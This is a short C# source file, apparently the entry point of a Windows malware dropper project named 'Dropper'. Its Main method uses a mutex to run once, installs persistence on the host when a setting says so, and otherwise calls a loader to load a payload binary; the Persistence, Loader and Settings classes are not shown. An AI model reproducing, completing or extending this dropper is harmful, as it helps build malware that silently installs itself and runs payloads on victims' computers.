using Dropper.Classes;
using System;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Dropper
{
    internal class Program
    {
        public static void Main()
        {
            var notAlreadyRunning = true;
            using (var mutex = new Mutex(true, Settings.Dropper.Mutex, out notAlreadyRunning))
            {
                if (notAlreadyRunning)
                {
                    if (Settings.Dropper.Install == "true")
                    {
                        if (!Persistence.IsRunningInstalled())
                        {
                            Persistence.Install();
                            Environment.Exit(0);
                        }
                        else
                        {
                            new Loader().loadBinary();
                            Environment.Exit(0);
                        }
                    }
                    new Loader().loadBinary();
                }
            }
            
        }
    }
}
